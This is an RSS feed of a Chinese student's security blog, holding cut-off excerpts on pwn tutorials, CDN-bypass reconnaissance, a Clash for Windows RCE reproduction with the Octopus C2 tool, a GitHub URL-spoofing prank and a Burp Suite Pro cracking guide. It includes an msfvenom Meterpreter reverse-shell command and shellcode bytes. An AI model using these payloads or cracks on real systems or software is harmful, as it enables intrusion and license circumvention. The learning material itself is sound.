<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on KiraPGR&#39;s Blog</title>
    <link>https://kira-pgr.github.io/posts/</link>
    <description>Recent content in Posts on KiraPGR&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 17 Mar 2022 00:23:45 -0400</lastBuildDate><atom:link href="https://kira-pgr.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Web安全:关于信息收集那些事</title>
      <link>https://kira-pgr.github.io/posts/web2/</link>
      <pubDate>Thu, 17 Mar 2022 00:23:45 -0400</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/web2/</guid>
      <description>关于信息收集那些事 在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小(毕竟你找到的东西越多，可能出现漏洞的几率越大嘛= =)
判断有无CDN 基本上通过超级ping就可以判断了awa
有CDN&amp;ndash;&amp;gt;尝试绕过 如果多地ping响应的ip不一样，说明该网站配置有CDN
绕过方法大致有:
  冷门地区地址ping:由于经费原因，服务商不大可能在某些地区搞CDN,所以往往用那些地区的ip来ping的话能找到服务器的真实ip
  DNS解析历史记录:有可能这个服务器之前没有配置CDN,查看历史DNS解析记录可以获得服务器真实IP
  黑暗引擎搜索
  奇怪的www.绕过:有可能某些网站CDN配置的时候忽视了一些细节(比如说带有www.的域名配置了CDN.不带有www.的没有)，部分网站可以用过ping去掉www.的域名来找出服务器真实IP, 比如说著名的学而思网校的网站= =
   咳咳= = 说到这里，某些同学应该跃跃欲试了吧= =，绕过CDN的测试昨晚玩玩可以，但请不要瞎搞
  特定文件hash值:这里放一个Python3脚本(PS:原脚本是基于python2的，我在其基础上修改了下)  # -*- coding: gb2312 -*- print(&amp;#34;Missing modules? Run the following commands in cmd/terminal&amp;#34;) print(&amp;#34;pip install base64&amp;#34;) print(&amp;#34;pip install requests&amp;#34;) print(&amp;#34;pip install mmh3&amp;#34;) import mmh3 import requests import base64 print(&amp;#34;Pls input the url you want to hash favicon(Include http(s):// )&amp;#34;) url = input() + &amp;#34;favicon.</description>
    </item>
    
    <item>
      <title>送给小白的IT入门指南</title>
      <link>https://kira-pgr.github.io/posts/noob1/</link>
      <pubDate>Wed, 09 Mar 2022 22:45:07 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/noob1/</guid>
      <description>0基础计算机小白自学IT的方法 ww又开一个新坑，至于原因嘛= =，就是很多小白入门第一个问题就是 &amp;ldquo;0基础怎么学xxx&amp;rdquo; 一类的问题，所以干脆就写篇关于这个的文章
至于PWN系列拖更的事情，就请谅解啦~
咕咕咕.QAQ.
前言 作为一个自学IT的高中生，个人认为在一开始起步的时候，经常会遇到很多问题以及踩很多多坑非常正常，在解决问题其实最重要的不是解决问题本身，而是学会解决问题的能力。本系列文章基本上就是着重教给大家如何解决问题，而不是铺天盖地的知识性的东西
什么时候学? 个人认为。。你什么时候学都不晚，只要你有兴趣，能学下去就可以= =
如何摆脱「0基础」 如果你之前以前没怎么用过电脑的话，想要入门IT肯定是一件「难事」,所以我们要先熟悉熟悉电脑的基本操作
至于怎么熟悉的话，也没有必要当作一个任务一样来「学习」，我的方法就是到处点点摸摸(反正不会坏，电脑没那么脆弱= =)，然后看看每个功能大概在哪里，每个按键大概是什么作用
搜索引擎的使用 咳咳咳，敲重点
 实际上，大家遇到的99%问题，都可以通过搜索解决，等你能熟练运用搜索引擎之后，你会发现。那1%你自己解决不了的问题，往往很多dalao也解决不了.QAQ.
 如果你要问:「搜索引擎」是什么? 看上去很高大上的样子
嘛。。说白了就是像百度搜索，360搜索一类的东西
&amp;ldquo;这么简单还要学??&amp;rdquo;
但实际上很多小白都没有真正掌握搜索引擎的使用
 当然，如果你能熟练的通过搜索解决你所遇到的大部分问题，而不是一有问题就不知所措，然后直接去问你认识的大佬，说明你这种技能已经掌握的差不多了，那么请直接跳过下面的「长篇大论」
 选一个合适的浏览器 某些流氓浏览器嘛。。不仅有那种「奇奇怪怪」的主页，还可能会经常去不了国外一些资源网站。。
实际上现在Windows内置的浏览器Edge就完全够用，而且很舒适，要是你想要用其他的浏览器的话，推荐Chrome和FireFox,建议不要使用360.2345一类的浏览器= =
选择一个合适的搜索引擎  由于本篇文章是面向小白的，我们暂且不提那些因为某些原因在国内不能访问的Google/DuckDuckGo等优秀搜索引擎
 搜索引擎的话。。基本上用百度或者bing就够了。尽量不要使用360搜索一类的，因为它们往往不能给你最准确的结果
如何搜索 一般在搜索东西的时候，可以采用关键词搜索法，不要像问人问题那样搜索(比如说带上「为什么」「怎么办」「可不可以」等词语)
 举个栗子：如果我想要知道如何用VMware Workstation安装虚拟机
你应该这么搜索
 VMware Workstation安装虚拟机  你不应该这么搜索
  如何用VMware Workstation安装虚拟机?
  VMware Workstation怎么安装虚拟机?
   还有就是每个搜索引擎有不同的高级搜索语法，利用这些搜索语法你可以指定搜索标题/网址/内容等
百度常用高级搜索语法
如果你不喜欢像代码一样的语法的话,可以采用高级搜索的图形界面
 百度的高级搜索图形界面 
有时候优秀的教程不一定需要购买 b站,曾被称为&amp;quot;b站大学&amp;quot;，里面有很多优秀的视频教程，大家有需要可以去搜索哦
选择学习的内容和方向 即使是IT行业也会有很多很多分支.QwQ.</description>
    </item>
    
    <item>
      <title>PWN! PWN! PANG! Part5 --- ret2shellcode</title>
      <link>https://kira-pgr.github.io/posts/pwn5/</link>
      <pubDate>Thu, 03 Mar 2022 05:50:08 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/pwn5/</guid>
      <description>PWN! PWN! PANG! Part5 呼～～好久没有继续更新PWN笔记了 (最近学的Web安全的笔记也没写 逃)
资料投放 老规矩，开头上资料= =
ret2shellcode
ShellCode 既然今天的话题叫做ret2shellcode,我们先来了解一下ShellCode
什么是ShellCode shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写
简而言之，ShellCode就是执行后可以直接getshell的代码
如何获取ShellCode 获取ShellCode有很多种方法，这里简单介绍几种
利用PWNTools自带函数 首先设置目标程序 的参数
context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;)# os指操作系统，这里是Linux # arch指架构，64位一般是amd64，32位一般是i386 # log_level指日志输出的等级，debug为调试模式 然后用shellcraft.sh()函数获取ShellCode的汇编代码，再调用asm()变成机器码
shellcode = asm(shellcraft.sh()) 网上找现成的ShellCode ShellStorm: 一个国外ShellCode集合
ShellStorm中包含多种平台，多种长度，多种功能的ShellCode
 为什么ShellCode会考虑长度？
答: 有时候栈中填入的ShellCode有长度限制
 这里举个例子，只有8字节的ShellCode
&amp;#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&amp;#34; metasploit 想要一个功能更强大且不想要网上到处找？
MSF的meterpreter你绝对喜欢
生成ShellCode命令
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Local IP Address&amp;gt; LPORT=&amp;lt;Local Port&amp;gt; -f &amp;lt;language&amp;gt; 自己写 建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个PDF
PWN! PWN! PANG? 本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode
大家可以先自己试试再看下面的思路分析.QwQ.
大概先提几点提示:
  ShellCode写入哪里呢？
  ShellCode的地址是什么？</description>
    </item>
    
    <item>
      <title>Clash猫猫RCE复现(弹shell)</title>
      <link>https://kira-pgr.github.io/posts/clash_rce/</link>
      <pubDate>Fri, 25 Feb 2022 23:27:12 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/clash_rce/</guid>
      <description>Clash For Windows RCE弹Shell  小白:RCE是什么
大佬:Reliable Computer Engineering (可靠的电脑工程)
咳咳，应该是Remote Code Execution(远程代码执行)= =
 免责声明 本文章为PGR的个人漏洞复现笔记，仅供参考/学习，如用文章中技术造成任何损失的后果自负
前期准备  Tip:请使用一个Linux机器和一个Windows机器，否则可能会出现&amp;lt;意想不到&amp;gt;的问题
(没有Linux? 去下载一个Kali Linux吧)
 一个有漏洞的Clash Windows 客户端 下载地址
下载后按照提示在Windows系统下安装即可
C2工具Octopus 在一个装好了Python3和Git的Linux系统执行以下的操作
 如果你没有安装，请参考
  安装Git
  安装Python3: 终端输入sudo apt install python3
  (由于大部分系统已经预装，如果你非deb系请自主上网搜索安装方式)
 git clone https://github.com/mhaskar/Octopus.git cd Octopus pip install -r requirements.txt python3 octopus.py 成功安装后你会看到如下界面
┌─[askar@hackbook]─[/opt/redteaming/Octopus] └──╼ $python3 octopus.py ___ ___ ___ ___ ___ ___ / /\  / /\  ___ / /\  / /\  /__/\  / /\  / /::\  / /:/ / /\  / /::\  / /::\  \  \:\  / /:/_ / /:/\:\  / /:/ / /:/ / /:/\:\  / /:/\:\  \  \:\  / /:/ /\  / /:/ \:\  / /:/ ___ / /:/ / /:/ \:\  / /:/~/:/ ___ \  \:\  / /:/ /::\  /__/:/ \__\:\ /__/:/ / /\  / /::\  /__/:/ \__\:\ /__/:/ /:/ /__/\  \__\:\ /__/:/ /:/\:\  \  \:\ / /:/ \  \:\ / /:/ /__/:/\:\  \  \:\ / /:/ \  \:\/:/ \  \:\ / /:/ \  \:\/:/~/:/ \  \:\  /:/ \  \:\  /:/ \__\/ \:\  \  \:\  /:/ \  \::/ \  \:\  /:/ \  \::/ /:/ \  \:\/:/ \  \:\/:/ \  \:\  \  \:\/:/ \  \:\  \  \:\/:/ \__\/ /:/ \  \::/ \  \::/ \__\/ \  \::/ \  \:\  \  \::/ /__/:/ \__\/ \__\/ \__\/ \__\/ \__\/ \__\/ v1.</description>
    </item>
    
    <item>
      <title>蹲点神器GitHub-CVE-Listener安利</title>
      <link>https://kira-pgr.github.io/posts/gcl/</link>
      <pubDate>Tue, 22 Feb 2022 21:18:34 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/gcl/</guid>
      <description>Github-CVE-Listener&amp;mdash;无需服务器的GitHub漏洞利用工具实时推送 没错= = 我来厚颜无耻地安利我自己写的工具了
 项目地址 https://github.com/Kira-Pgr/Github-CVE-Listener
功能 无需服务器的GitHub漏洞利用工具实时推送(目前支持推送到TG/微信)
 Telegram 
 微信 
使用方法 https://github.com/Kira-Pgr/Github-CVE-Listener/blob/main/README_ZH.md
项目特点 目前其他的GitHub监听器都需要依赖自己的服务器来运行，本Project使用GitHub Actions
运行，不需要依赖其他任何环境(即使你没有电脑也可以使用) :)
对于像我这种没有服务器的人比较友好啊
补充 如果你拥有服务器并希望在服务器跑的话可以使用另一个优秀的项目</description>
    </item>
    
    <item>
      <title>PWN! PWN! PANG! Part4 --- ret2text</title>
      <link>https://kira-pgr.github.io/posts/pwn4/</link>
      <pubDate>Thu, 10 Feb 2022 22:54:20 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/pwn4/</guid>
      <description>PWN! PWN! PANG! Part4 必须有的前言 从Part4开始我们就要正式进入实战部分了哦qaq,
本篇文章主要讲述最最简单的一种栈溢出利用姿势ret2text
资料投放&amp;gt;__&amp;lt;   IDA Pro 7.5
  ret2text题目
   P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快且可以脱离客户端
 补充知识点：Linux程序安全保护机制 ASLR: 地址随机化技术   全名: Address Space Layout Randomization
  系统的保护措施, 和程序没有关系, 一般默认目标机器随机化完全开启
  每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。
  可以通过cat /proc/sys/kernel/randomize_va_space查看系统保护的开启情况
   ASLR选项:
0 关闭
1 半随机 共享库 栈 mmap()分配的堆空间以及VDSO将被随机化
2 全随机 brk()分配的堆空间也被虚拟化
 PIE: 随机化ELF文件映射地址 好饿，想吃馅饼了 雾)
  全名: Position-Independent Executable
  程序的防护措施，编译时生效</description>
    </item>
    
    <item>
      <title>留言板</title>
      <link>https://kira-pgr.github.io/posts/comment/</link>
      <pubDate>Thu, 10 Feb 2022 07:54:34 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/comment/</guid>
      <description>嘛。。。= = 这是一个留言板 嘿嘿，小伙伴们可以在下面评论区畅所欲言哦
大家可以给我留言，求资源，交流技术，在这里交朋友
甚至可以贴广告
咳咳，当然是非盈利性的那种= = 我们是开源主义者XD
 PS:如果我博客的文章内容有什么技术上的错误的话烦请各位dalao指正哦.qaq.
  </description>
    </item>
    
    <item>
      <title>Hugo Stack主题简单美化</title>
      <link>https://kira-pgr.github.io/posts/hugo2/</link>
      <pubDate>Wed, 09 Feb 2022 04:35:37 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/hugo2/</guid>
      <description>Hugo Stack 简单美化/配置 前言 本篇文章主要是说说几个我在搭建博客的时候采用的几种美化/配置方式，
如大家有其他需求的话，可以去康康文末几个参考链接
分类部分加上缩略图 在你网站根目录(术语不理解的话看上一篇文章)打开终端/cmd/其他命令行工具，
并输入
hugo new categories/分类名字/_index.md  注意: index前面下划线不能少
 然后修改_index.md成下面这种样子
---title:&amp;#34;分类名&amp;#34;date:2022-02-08T01:03:14-05:00image:你的图片名(带后缀)style:background:&amp;#34;#2a9d8f&amp;#34;color:&amp;#34;#fff&amp;#34;--- 注意: 请把图片和_index.md放在同一目录里
 代码:给你点Color See See 咳咳，关于代码框框着色问题= =
只需要指明代码类型是可以着色的qaq
 代码块着色 
文本特效 在网站根目录/static/css/内新建一个文件custom.css
以下是custom.css代码
.blur { color: transparent; text-shadow:0px 0px 8px rgba(0,0,0,0.5) } .blur:hover { color: transparent; text-shadow:0px 0px 0px rgba(0,0,0,1) } .shady { color:#000; font-weight: bold; box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; transition: all 0.3s ease; } .shady:hover{ font-weight: bold; color:#FFF; box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; } 还有，由于你要在MarkDown中内嵌html代码，你需要修改一下配置文件(网站根目录下的config.</description>
    </item>
    
    <item>
      <title>Burp Suite Professional 安装&#43;破解教程</title>
      <link>https://kira-pgr.github.io/posts/burppro/</link>
      <pubDate>Tue, 08 Feb 2022 07:42:01 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/burppro/</guid>
      <description>Burp Suite Professional 安装+破解教程 嗝~~
(Burp在英文中有打嗝的意思)
前言 咳咳，先声明一下，当你看到这篇文章的时候，它很可能已经是 过时 的了= =,
由于Burp会不断更新换代，本文章提供的软件安装包不可能提供最新安装包，如果你觉得版本太旧了，请自行网上搜索最新安装包，但文章提供的破解工具 应该 能保证在之后一段时间内有用
资源   破解工具
  Burp Suite Pro v2022.1
  使用 JAVA环境 运行Burp Suite Professional需要提前安装好java环境
  Windows Java下载
  Linux
  deb系
sudo apt install default-jdk Red Hat
sudo yum install java-版本号-openjdk-devel Linux Java下载
嗝～～开始破解 注意：请把Burp的文件和破解工具放入同一个文件夹
终端/cmd/你奇奇怪怪的命令行工具进入放有以上两个文件的目录
先运行破解工具
java -jar burploader.jar  破解工具 
这里License Text随便填一些东西(这些东西之后会显示在你的Burp标题栏上，可以考虑搞些酷酷的东西)
 TIP: 如果你是JAVA 17+, 记得不要直接点旁边的RUN(要不然会报错)</description>
    </item>
    
    <item>
      <title>PWN! PWN! PANG! Part3 --- 栈溢出基础</title>
      <link>https://kira-pgr.github.io/posts/pwn3/</link>
      <pubDate>Mon, 07 Feb 2022 07:51:10 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/pwn3/</guid>
      <description>PWN! PWN! PANG! Part3 这是一篇黑暗童话故事 确信)
至于简介嘛= =，好奇的话就把文章看完吧qaq
C语言函数调用栈 了解函数调用栈   函数调用栈是指程序运行时内存一段连续的区域
  用来保存函数运行时的状态信息，包括函数参数与局部变量等
  称之为“栈”是因为发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶
  在函数调用结束时，栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态
  函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大
   配图 
关于栈帧 咳咳，上面很官方的解释是不是不容易理解.qwq.
实际上上面所说的&amp;quot;函数的状态&amp;quot;在栈中是由一个一个栈帧(Stack Frame)表示的，基本上 (特殊情况的话，可能是某些在main函数前调用的函数) 每一个函数调用时在栈中都有自己的栈帧
 栈帧结构预览 
 在这里，我们需要了解一下几点
  三个指针(寄存器)：
  ebp指向当前栈帧底部(保存当前栈帧底部地址)
至于为什么在上面，是因为栈从高地址向低地址增长
  esp指向栈顶(保存栈顶地址)
  eip指向要执行的下一指令(保存下一条指令地址)
    参数(arguments)是保存在父函数栈帧中的(类似于父亲给儿子的&amp;quot;启动资金&amp;quot;)
 注意， 参数是逆序压栈滴
  参数的保存 
  返回地址(Return Address)保存了调用子函数前eip值，这个值在我们栈溢出攻击中至关重要，控制这个值之后就可以劫持程序执行流，让程序下一步执行你想要的指令</description>
    </item>
    
    <item>
      <title>PWN! PWN! PANG! Part2 --- 工具的使用</title>
      <link>https://kira-pgr.github.io/posts/pwn2/</link>
      <pubDate>Sat, 29 Jan 2022 21:35:29 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/pwn2/</guid>
      <description>PWN! PWN! PANG! Part2 前言 说完了前面那些基础 (貌似一点也不基础) 知识，今天再来谈谈工具
由于我们研究的是Linux下的PWN,接下来的操作请在Linux下进行
 只有Windows怎么办？
 方案一：使用VMware Workstation Pro安装Linux虚拟机(我目前的方案)   小Tip:某些Linux发行版(例如Kali)可以在官网找到现成的虚拟机文件下载，如果你没有安装过虚拟机 (或懒得安装) ，可以试试这种方式
  方案二：使用WSL2(怎么说呢，WSL2虽说占空间小，而且有了GUI,但配置其实挺麻烦)   PWNDBG pwndbg是Linux GDB的一个专门为PWN设计的一个插件, 能有助于我们调戏调试程序
 pwndbg 
安装 一般Linux都会预装gdb吧= =，不过还是扯一下安装方法好了
Deb 系
sudo apt install gdb yum系 快去用Debian 逃)
sudo yum -y install centos-release-scl sudo yum-config-manager --enable rhel-server-rhscl-7-rpms sudo yum -y install devtoolset-7 scl enable devtoolset-7 bash 安装pwndbg
git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh  安装踩坑记 注意:pwndbg这个目录请不要删除或随意移动位置,否则可能会导致pwndbg无法正常启动</description>
    </item>
    
    <item>
      <title>Hugo无需服务器搭建个人博客</title>
      <link>https://kira-pgr.github.io/posts/hugo1/</link>
      <pubDate>Sat, 29 Jan 2022 02:02:45 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/hugo1/</guid>
      <description>用GitHub服务器免费搭建博客 安装环境(Linux) 安装Hugo yum系
sudo yum install hugo -y Arch
sudo pacman -S hugo deb系
sudo apt install hugo 安装Git(系统已经预装的自行忽略) yum系
sudo yum install git Arch
sudo pacman -Syu git deb系
sudo apt install git 安装环境(Windows) 安装Hugo https://gohugo.io/getting-started/installing/#less-technical-users
安装Git winget install Git.Git  开始建站.UwU.! GitHub项目创建  注册/登录GitHub帐号   P.S. 因为众所周知的原因。。在某些地区GitHub无法访问= =
解决方案: 魔法上网/换Gitee(要实名= =)
   创建一个名为你的Github用户名.github.io的项目
  放在那里备用
  本地网站搭建  注意：我本地环境是Kali Linux, 其他环境可能步骤略有不同= =</description>
    </item>
    
    <item>
      <title>Web安全--浏览器信息伪造</title>
      <link>https://kira-pgr.github.io/posts/web1/</link>
      <pubDate>Fri, 28 Jan 2022 22:53:47 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/web1/</guid>
      <description>Web安全&amp;mdash;-浏览器信息伪造 &amp;ldquo;诶。。。PGR酱你用的什么浏览器&amp;rdquo;
— MimiKs-Sec-Browser.QwQ.
&amp;ldquo;啊= =哪有这种浏览器&amp;rdquo;
— 诶嘿嘿，我就有这样神奇的浏览器XD
 诶嘿嘿，有图片作证哦qaq 
 如何拥有神奇的浏览器;) 咳咳咳，进入正题
要实现以上的效果，就要用到浏览器信息伪造技术
浏览器信息伪造的实现 网站判断你的设备和浏览器信息主要是依据你发向网站的数据包
所以我们通过修改数据包实现浏览器信息伪造awa
Burp Suite抓包 想要修改数据包，我们必须先抓获它
(刚从野外抓到一只野生数据包)
 抓包工具推荐Burp Suite   Burp Suite 
 Burp Suite的大概原理：
burp类似于代理服务器，&amp;ldquo;拦&amp;quot;你的浏览器和服务器之间，能够发现，拦截过往的数据包
  Update: 本文章图片里用的是Burp Suite 社区免费版，如需要免费获取专业版，可以参考我的另一篇文章
 切到Proxy(代理)的标签页，打开burp内置浏览器，打开intercept(中断拦截)开关，就可以愉快地开始抓包了qaq
以ip查询网站ip.chinaz.com为例
抓到的数据包
GET / HTTP/1.1 Host: ip.chinaz.com Cookie: qHistory=aHR0cDovL2lwLmNoaW5hei5jb21fSVAvSVB2Nuafpeivou+8jOacjeWKoeWZqOWcsOWdgOafpeivog==; cz_statistics_visitor=6e92e1cd-3bd8-6ec0-9e75-271a4c8dfe89; UM_distinctid=17e9ad54d9ea91-0de9b86d1a8b15-f791b31-e1000-17e9ad54d9faa3; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1643278444,1643280347,1643281459,1643430361; CNZZDATA5082706=cnzz_eid%3D1961137514-1643271376-%26ntime%3D1643422648; SECKEY_ABVK=d8C9ZBZRX6Qya0VNufaZozKriQgZkNE9wBJvCc1YVMo%3D; BMAP_SECKEY=ZvL10u-tISavTuXtRnLwuMF6SZ4DS3InrGol25-dIiWXTBfvmHf1rOql24bKE6-K7ExBo1yo-mlyN-y7jnL9aasP3q6E4R0onZG-ZZW_unKjL13-oBTm8QkEMlFdp3r8C7gTLnuhcWNYDIBVi6s_AOD-H2CjUVKCvfGq6TnZPfxkHkBk2xyM8n1R0E_onq6F Sec-Ch-Ua: &amp;#34;Chromium&amp;#34;;v=&amp;#34;97&amp;#34;, &amp;#34; Not;A Brand&amp;#34;;v=&amp;#34;99&amp;#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: &amp;#34;Windows&amp;#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.</description>
    </item>
    
    <item>
      <title>PWN! PWN! PANG! Part1---基础知识</title>
      <link>https://kira-pgr.github.io/posts/pwn1/</link>
      <pubDate>Thu, 27 Jan 2022 21:24:46 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/pwn1/</guid>
      <description>PWN! PWN! PANG! Part1 前言 这里是PGR的PWN基础学习笔记qaq，主要研究的是Linux下ELF可执行文件的漏洞利用
涉及内容:
 栈(Stack)的漏洞利用，主要是栈溢出(Stack Overflow)攻击   PS: 说到Stack Overflow就必须得说一个同名的国外著名IT论坛(真的特别特别特别好用)
重要的事情说三遍哈XD
https://stackoverflow.com/
   C语言Printf()函数格式化字符串漏洞(Format String)
  一小点堆(Heap)利用
   AND: 文章中涉及的题目文件会全部随文章发出来
如果各位不想一个一个下载的话，这边有一个环境搭好(工具+题目)的Xubuntu Linux(VMware虚拟机)
链接如下:
mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Efyh9fLtgIZCi2Q21hCXLI0BFrHp17qc9ZxHW6mjovmSBw?e=BUtZzA
如果想只下载题目的话:
mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Eefb6Yqp7vpGriwwFz6wQCkBtjqcFnGZwZTAyK2fJhA_FA?e=gjHVUW
什么是PWN? PWN原指黑客攻破系统发出的“砰”的响声，在这里我们解释为二进制漏洞挖掘与利用
分步来讲的话 = = 大概可以概括为以下几点：
  破解、利用成功（程序的二进制漏洞）
  攻破（设备、服务器）
  控制（设备、服务器）
   配个图 
Linux下ELF文件 ELF文件的是Linux下的可执行文件，与Windows下exe文件不同
可以用File命令查看你的文件格式:
 File命令 
 不过这里有一个很有趣的地方，由于File命令依据文件头判断文件类型，Linux的后缀名并不影响File命令判断文件是ELF文件(即使a.out已经变成了a.zip)
不过在文件夹窗口里双击这个.zip, 就会发现:这个ELF文件已经被当成压缩包打开 (这和win似乎很像)
可见在修改后缀名的过程中，干扰了系统对于文件打开方式的识别= =
  嘿嘿= =, 被迷惑了呢;)</description>
    </item>
    
    <item>
      <title>About Me</title>
      <link>https://kira-pgr.github.io/posts/about_me/</link>
      <pubDate>Thu, 27 Jan 2022 01:03:14 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/about_me/</guid>
      <description>KiraPGR 大家好, 我是PGR, 欢迎大家来到我的Blog,
本篇文章是对我自己简单的一个介绍
KiraPGR是谁？ 我是一个高中在读学生，开源主义者，熟悉c++/Python开发 ,平常喜欢自己折腾折腾计算机技术，也不时会写一点小Project(基本上以工具为主),目前主要在研究信息安全方面，如果有意向的朋友们可以和我一起学习哦qaq
关于本博客 搭建这个博客的目的呢，主要是为了能和大家共享我自己学到的一些知识 (刚好就有动力写一点笔记了 )，同时呢，还希望能结交到一些志同道合的好朋友awa
联系方式   邮箱: aieternal@outlook.com
  TG: https://t.me/pgr47
  b站(已废弃): https://space.bilibili.com/66912843
  QQ: 1532375915
  我的朋友们  黑兔由帝: https://space.bilibili.com/351510324/ WeepingDogel: https://weepingdogel.github.io/ Kera: https://space.bilibili.com/37960560 小仙女: http://blog.233.pink/  </description>
    </item>
    
    <item>
      <title>GitHub逻辑漏洞:Linus大神&#39;怒删&#39;Linux</title>
      <link>https://kira-pgr.github.io/posts/github_vuln/</link>
      <pubDate>Wed, 26 Jan 2022 21:15:07 -0500</pubDate>
      
      <guid>https://kira-pgr.github.io/posts/github_vuln/</guid>
      <description>GitHub url修改逻辑漏洞 前言： 大家好，我是鸽子PGR, 这是我第一篇博客= =
同时呢，这也意味着我接下来会放弃b站更新视频，主要是想要多花一些时间提升一下自己的技术，并通过写博客的形式做笔记，毕竟做视频真的很麻烦qaq
(其实只是因为懒 别打)
一. 漏洞演示 咳咳，言归正传 OwO
最近刷GitHub的时候看到了这个
 啥？Linus大神居然说Linux糟糕至极，并删除Linux项目推荐我们用Win XP 
Linus真的一反常态删除了Linux??
很显然这是假的~
或者说，这是一个硬核恶作剧= =
而这个恶作剧利用了GitHub一个小小的逻辑漏洞
二. 漏洞复现  如果你嘤文水平不戳的话，可以参考https://news.ycombinator.com/item?id=24976138
 想要利用这个漏洞，你只需要一个GitHub帐号和一个浏览器
首先Fork某一个项目，然后在你fork的项目中随便改点东西(任意的东西都可以)
至于Fork键的位置，自己找
然后点进你新加上的commit
 commit位置 
commit链接
 https://github.com/Kira-Pgr/MEMZ/commit/43ab3c1283605216e5b56388c11483fee7dcd47c
 把commit 改为tree
 https://github.com/Kira-Pgr/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c
 最后，把你的id(这里演示时是Kira-Pgr)改成你想要&amp;quot;修改&amp;quot;对方项目的人的id
(这里的id是NyDubh3)
 https://github.com/NyDubh3/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c
 这样你修改的东西就看来像是在原项目里一样 qaq
 原项目被&amp;quot;修改&amp;quot;啦= = 
结语： 这个洞虽说危害不大，而且只需要判断commit是不是从一个fork来的就可以避免受到影响
但还是很好VAN的 逃)
(⁄ ⁄•⁄ω⁄•⁄ ⁄)</description>
    </item>
    
  </channel>
</rss>
